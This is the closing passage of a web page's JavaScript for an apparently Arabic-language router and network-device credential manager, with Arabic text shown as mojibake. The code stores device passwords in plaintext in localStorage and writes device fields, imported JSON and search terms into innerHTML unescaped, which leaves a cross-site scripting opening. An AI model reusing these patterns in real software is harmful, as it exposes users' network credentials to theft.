                                    ${hasUsername ? `<button class="copy-btn" title="Ù†Ø³Ø® Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" onclick="event.stopPropagation(); copyToClipboard('${device.username}', 'Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…')"><i class="fas fa-copy"></i></button>` : ''}
                                </span>
                            </div>
                            <div class="credential-item">
                                <span class="credential-label"><i class="fas fa-key"></i> ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±:</span>
                                <span class="password-display">
                                    <span id="pass-${device.id}" data-password="${device.password}">${maskedPassword}</span>
                                    ${hasPassword ? `<button class="toggle-password" onclick="event.stopPropagation(); togglePassword(${device.id}, this)" data-visible="false"><i class="fas fa-eye-slash"></i></button>` : ''}
                                    ${hasPassword ? `<button class="copy-btn" title="Ù†Ø³Ø® ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" onclick="event.stopPropagation(); copyPasswordToClipboard(${device.id})"><i class="fas fa-copy"></i></button>` : ''}
                                </span>
                            </div>
                            <div class="credential-item" style="border-bottom:none;">
                                <span class="credential-label"><i class="fas fa-desktop"></i> IP Address:</span>
                                <span class="ip-display">
                                    ${device.ip}
                                    <button class="copy-btn" title="Ù†Ø³Ø® IP" onclick="event.stopPropagation(); copyToClipboard('${device.ip}', 'IP')"><i class="fas fa-copy"></i></button>
                                </span>
                            </div>
                        </div>
                        <div class="device-info">
                            <p>${device.description || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙˆØµÙ'}</p>
                        </div>
                        
                        <button class="note-toggle-btn" data-target="#notes-${device.id}" aria-expanded="false" onclick="event.stopPropagation(); toggleNotes(${device.id}, this)">
                            <i class="fas fa-angle-down"></i> ØªØ¯ÙˆÙŠÙ† Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
                        </button>
                        <div id="notes-${device.id}" class="notes-content">
                            <textarea class="notes-textarea" placeholder="Ù…Ù„Ø§Ø­Ø¸Ø§Øª..." onkeyup="saveNote(${device.id}, this.value)">${device.notes}</textarea>
                        </div>

                        <div class="device-actions">
                            <button class="btn-connect" onclick="event.stopPropagation(); promptLogin(${device.id})">
                                <i class="fas fa-lock"></i> Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆØ§Ù„ØªØ­Ù‚Ù‚
                            </button>
                            <button class="btn-remove" onclick="event.stopPropagation(); removeDevice(${device.id})"><i class="fas fa-trash"></i></button>
                        </div>
                    `;
                    // ØªØµØ­ÙŠØ­: Ø¥Ø¶Ø§ÙØ© listener Ù„Ù„Ø¨Ø·Ø§Ù‚Ø© Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ promptLogin
                    deviceCard.addEventListener('click', function(e) {
                         // Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ù†Ù‚Ø± Ù„ÙŠØ³ Ø¹Ù„Ù‰ Ø¹Ù†ØµØ± ØªØ­ÙƒÙ… (Ø²Ø±ØŒ Ø­Ù‚Ù„ Ù†ØµÙŠØŒ Ø£Ùˆ Ø²Ø± ØªØ¨Ø¯ÙŠÙ„)
                        if (!e.target.closest('.device-actions') && !e.target.closest('.note-toggle-btn') && !e.target.closest('.notes-content') && !e.target.closest('.toggle-password') && !e.target.closest('.copy-btn')) {
                            promptLogin(device.id);
                        }
                    });
                    devicesContainer.appendChild(deviceCard);
                });
            } else {
                emptyState.style.display = 'block';
                if (searchTerm) {
                    emptyState.innerHTML = `<i class="fas fa-search-minus"></i><h3>Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù†ØªØ§Ø¦Ø¬ Ù„Ù€ "${searchTerm}"</h3>`;
                } else {
                     emptyState.innerHTML = `<i class="fas fa-box-open"></i><h3>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…Ø¶Ø§ÙØ© (${FIRMWARE_NAMES[filter]})</h3>`;
                }
            }
        }
        
        // --- Ø¯Ø§Ù„Ø© Ø¹Ø±Ø¶ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© (Modal) (ØªØ°ÙƒÙŠØ± Ø¨Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª) ---
        window.promptLogin = function(id) {
            const device = devices.find(d => d.id === id);
            if (!device) return;
            
            document.getElementById('modalDeviceId').value = id;
            document.getElementById('modalDeviceName').textContent = device.name;
            
            // Ø¥Ù„ØºØ§Ø¡ Ø´Ø±Ø· "required"
            modalUsernameInput.value = device.username;
            modalPasswordInput.value = device.password;
            modalUsernameInput.removeAttribute('required');
            modalPasswordInput.removeAttribute('required');

            loginModal.style.display = 'flex';
        }

        window.closeModal = function() {
            loginModal.style.display = 'none';
            modalLoginForm.reset();
        }

        // --- Ø¯Ø§Ù„Ø© Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ (ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ù…Ø¨Ø§Ø´Ø±Ø©) ---
        modalLoginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const deviceId = parseInt(document.getElementById('modalDeviceId').value);
            const device = devices.find(d => d.id === deviceId);
            
            if (device) {
                showNotification(`Ø¬Ø§Ø±ÙŠ ÙØªØ­ ØµÙØ­Ø© Ø§Ù„Ø¬Ù‡Ø§Ø² ${device.name}... Ø£Ø¯Ø®Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø¥Ø°Ø§ Ø·ÙÙ„Ø¨Øª!`, 'success');
                closeModal();
                openDeviceUrl(device.ip);
            }
        });

        // --- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªØ®Ø²ÙŠÙ† ÙˆØ§Ù„Ù…Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ© ---
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¥Ø¸Ù‡Ø§Ø± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        window.togglePassword = function(id, button) {
            const passSpan = document.getElementById(`pass-${id}`);
            let isVisible = button.getAttribute('data-visible') === 'true';
            const password = passSpan.getAttribute('data-password');
            if (isVisible) {
                passSpan.textContent = password.length > 0 ? '*'.repeat(8) : 'Ù„Ø§ ÙŠÙˆØ¬Ø¯';
                button.setAttribute('data-visible', 'false');
                button.innerHTML = '<i class="fas fa-eye-slash"></i>';
            } else {
                passSpan.textContent = password;
                button.setAttribute('data-visible', 'true');
                button.innerHTML = '<i class="fas fa-eye"></i>';
            }
        }

        // Ù†Ø³Ø® Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©
        window.copyToClipboard = function(text, type = 'Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª') {
            navigator.clipboard.writeText(text).then(() => {
                showNotification(`ØªÙ… Ù†Ø³Ø® ${type} Ø¨Ù†Ø¬Ø§Ø­!`, 'success');
            }).catch(err => {
                showNotification(`ÙØ´Ù„ Ø§Ù„Ù†Ø³Ø®: ${err}`, 'danger');
            });
        }
        
        // Ù†Ø³Ø® ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± (Ø³ÙˆØ§Ø¡ ÙƒØ§Ù†Øª Ù…Ø±Ø¦ÙŠØ© Ø£Ùˆ Ù…Ø®ÙÙŠØ©)
        window.copyPasswordToClipboard = function(id) {
            const passSpan = document.getElementById(`pass-${id}`);
            const password = passSpan.getAttribute('data-password');
            if(password) {
                 copyToClipboard(password, 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±');
            } else {
                 showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ù„Ù†Ø³Ø®Ù‡Ø§.', 'danger');
            }
        }


        window.toggleNotes = function(id, button) {
            const notesContent = document.getElementById(`notes-${id}`);
            const isExpanded = button.getAttribute('aria-expanded') === 'true';
            if (isExpanded) {
                notesContent.classList.remove('expanded');
                button.setAttribute('aria-expanded', 'false');
            } else {
                notesContent.classList.add('expanded');
                button.setAttribute('aria-expanded', 'true');
            }
        }

        window.saveNote = function(id, value) {
            const deviceIndex = devices.findIndex(device => device.id === id);
            if (deviceIndex !== -1) {
                devices[deviceIndex].notes = value.trim();
                saveDevicesToLocalStorage();
            }
        }
        
        function saveDevicesToLocalStorage() {
            try {
                localStorage.setItem('alhaithmDevices', JSON.stringify(devices));
            } catch (e) {
                showNotification('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ÙØ¸ Ø§Ù„Ù…Ø­Ù„ÙŠ.', 'danger');
            }
        }

        function getDeviceIcon(type) {
            const icons = {
                'tplink': 'fas fa-server', 'mikrotik': 'fas fa-network-wired',
                'pfsense': 'fas fa-shield-alt', 'isp_router': 'fas fa-globe',
                'ddwrt': 'fas fa-wifi', 'realtek': 'fas fa-network-wired',
                'nano': 'fas fa-satellite-dish', 'nets': 'fas fa-link',
                'tomato': 'fas fa-globe', 'openwrt': 'fas fa-code-branch'
            };
            return icons[type] || 'fas fa-cogs';
        }

        window.removeDevice = function(id) {
            if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø²ØŸ')) {
                devices = devices.filter(device => device.id !== id);
                saveDevicesToLocalStorage();
                renderDevices(currentFilter); 
                showNotification('ØªÙ… Ø­Ø°Ù Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¨Ù†Ø¬Ø§Ø­!', 'danger');
            }
        }
        
        window.clearAllDevices = function() {
            if (devices.length === 0) return;
            if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©ØŸ') && confirm('ØªØ£ÙƒÙŠØ¯ Ù†Ù‡Ø§Ø¦ÙŠØŸ Ø³ÙŠØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª.')) {
                devices = [];
                localStorage.removeItem('alhaithmDevices');
                renderDevices(currentFilter);
                showNotification('ØªÙ… Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©!', 'danger');
            }
        }

        // --- ØªØµØ¯ÙŠØ± ÙˆØ§Ø³ØªÙŠØ±Ø§Ø¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Ø¬Ø¯ÙŠØ¯) ---
        window.exportDevices = function() {
            if (devices.length === 0) {
                showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù„Ø­ÙØ¸Ù‡Ø§.', 'danger');
                return;
            }
            const dataStr = JSON.stringify(devices, null, 2);
            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
            
            const exportFileDefaultName = 'alhaitham_net_devices_backup.json';
            
            const linkElement = document.createElement('a');
            linkElement.setAttribute('href', dataUri);
            linkElement.setAttribute('download', exportFileDefaultName);
            linkElement.click();
            showNotification('ØªÙ… ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­! ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ù„Ù alhaitham_net_devices_backup.json', 'success');
        }

        window.importDevices = function(event) {
            const file = event.target.files[0];
            if (!file) return;

            if (file.type !== 'application/json') {
                showNotification('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø®ØªÙŠØ§Ø± Ù…Ù„Ù JSON ØµØ­ÙŠØ­.', 'danger');
                return;
            }

            const reader = new FileReader();
            reader.onload = function(e) {
                try {
                    const importedData = JSON.parse(e.target.result);
                    if (Array.isArray(importedData) && importedData.every(item => item.ip && item.name)) {
                        
                        // ØªØ¹ÙŠÙŠÙ† ID Ø¬Ø¯ÙŠØ¯ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙƒØ±Ø±Ø§Ù‹ ÙˆØªÙˆØ­ÙŠØ¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                        const newDevices = importedData.map(device => ({
                            id: device.id || Date.now() + Math.floor(Math.random() * 1000), 
                            name: (device.name || 'Ù…Ø³ØªÙˆØ±Ø¯').trim(),
                            ip: (device.ip || '').trim(),
                            username: (device.username || '').trim(), 
                            password: (device.password || '').trim(), 
                            type: device.type || 'isp_router',
                            description: (device.description || '').trim(),
                            status: device.status || (Math.random() > 0.2 ? "online" : "offline"), 
                            notes: device.notes || ''
                        }));

                        devices = newDevices;
                        saveDevicesToLocalStorage();
                        renderDevices(currentFilter);
                        showNotification(`ØªÙ… Ø§Ø³ØªÙŠØ±Ø§Ø¯ ${newDevices.length} Ø¬Ù‡Ø§Ø² Ø¨Ù†Ø¬Ø§Ø­!`, 'success');
                    } else {
                        showNotification('Ù…Ù„Ù JSON ØºÙŠØ± ØµØ§Ù„Ø­ Ø£Ùˆ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª Ù†Ø§Ù‚ØµØ©.', 'danger');
                    }
                } catch (error) {
                    showNotification('Ø®Ø·Ø£ ÙÙŠ Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„Ù JSON.', 'danger');
                    console.error('Import Error:', error);
                } finally {
                    // ØªÙØ±ÙŠØº Ø­Ù‚Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ Ù„ØªÙ…ÙƒÙŠÙ† Ø§Ø®ØªÙŠØ§Ø± Ù†ÙØ³ Ø§Ù„Ù…Ù„Ù Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
                    event.target.value = '';
                }
            };
            reader.readAsText(file);
        }

        // --- Ø¯ÙˆØ§Ù„ Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡Ø§Øª (Notification) ---
        function showNotification(message, type) {
            document.querySelectorAll('.notification').forEach(n => n.remove());
            const notification = document.createElement('div');
            notification.className = `notification notification-${type}`;
            notification.innerHTML = `<div class="notification-content"><span>${message}</span></div><button onclick="closeNotification(this)"><i class="fas fa-times"></i></button>`;
            
            notification.style.cssText = `
                position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
                background: var(--bg-secondary); color: var(--text-color);
                padding: 15px 25px; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.2);
                display: flex; gap: 15px; z-index: 2000; border-bottom: 3px solid ${type === 'success' ? '#28a745' : '#dc3545'};
                min-width: 300px; text-align: right;
            `;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 4000);
        }
        window.closeNotification = (el) => el.parentElement.remove();
    </script>
</body>
</html>
